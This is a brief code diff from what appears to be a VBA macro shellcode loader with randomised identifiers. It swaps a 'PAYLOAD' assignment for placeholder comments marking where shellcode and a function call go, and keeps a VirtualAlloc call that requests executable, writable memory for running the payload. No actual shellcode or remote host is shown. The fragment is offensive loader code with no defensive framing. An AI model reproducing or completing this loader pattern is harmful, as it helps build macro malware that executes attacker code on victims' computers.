@@ -13,7 +13,9 @@ Function NTj()
     Dim ETC As Long
     Dim HoR() As Variant
 
-    HoR = PAYLOAD
+    'ShellCode
+
+    'Function Call
 
     EOu = stdCallA("kernel32", "VirtualAlloc", vbLong, 0&, UBound(HoR), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     
